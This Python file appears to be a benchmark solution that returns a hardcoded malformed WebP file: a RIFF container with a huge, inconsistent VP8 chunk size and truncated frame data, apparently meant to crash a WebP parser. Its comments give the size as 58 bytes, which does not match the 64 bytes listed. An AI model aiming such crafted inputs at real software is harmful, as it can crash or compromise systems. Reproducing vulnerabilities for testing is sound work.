import os
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Static PoC crafted for a RIFF/WEBP parser
        # 58-byte RIFF WEBP container with inconsistent chunk sizes
        return bytes([
            0x52, 0x49, 0x46, 0x46,  # 'RIFF'
            0x32, 0x00, 0x00, 0x00,  # file size = 58 - 8 = 50
            0x57, 0x45, 0x42, 0x50,  # 'WEBP'
            0x56, 0x50, 0x38, 0x20,  # 'VP8 '
            0xFF, 0xFF, 0xFF, 0x7F,  # huge chunk size (inconsistent with RIFF size)
            # Minimal VP8 keyframe header (truncated)
            0x10, 0x00, 0x00,        # frame tag
            0x9D, 0x01, 0x2A,        # start code
            0x00, 0x00,              # width - 1 (little endian, with scale bits 0)
            0x00, 0x00,              # height - 1
            # Remaining payload (garbage/truncated data)
            0xFF, 0xFF, 0x00, 0x00,
            0x01, 0x02, 0x03, 0x04,
            0x05, 0x06, 0x07, 0x08,
            0x09, 0x0A, 0x0B, 0x0C,
            0x0D, 0x0E, 0x0F, 0x10,
            0x11, 0x12, 0x13, 0x14,
            0x15, 0x16, 0x17, 0x18,
            0x19, 0x1A, 0x1B, 0x1C,
            0x1D, 0x1E
        ])
